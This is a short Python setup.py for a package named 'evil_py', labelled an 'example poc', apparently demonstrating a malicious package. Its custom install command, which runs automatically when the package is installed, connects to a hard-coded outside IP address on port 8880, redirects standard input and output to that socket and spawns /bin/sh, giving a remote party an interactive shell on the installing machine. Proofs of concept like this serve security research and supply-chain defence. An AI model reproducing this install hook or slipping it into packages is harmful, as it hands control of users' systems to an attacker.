import socket, struct, time, os
import setuptools
from setuptools.command.install import install
import socket,os,pty

class evil_py_class(install):
  def run(self):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("104.197.170.248",8880))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/sh")

setuptools.setup(
  name="evil_py",
  version="1.0.0",
  author="danzajork",
  author_email="dontemail@me.com",
  description="example poc",
  long_description="example poc",
  long_description_content_type="text/markdown",
  url="https://github.com/danzajork",
  packages=setuptools.find_packages(),
  cmdclass={ "install": evil_py_class }
)
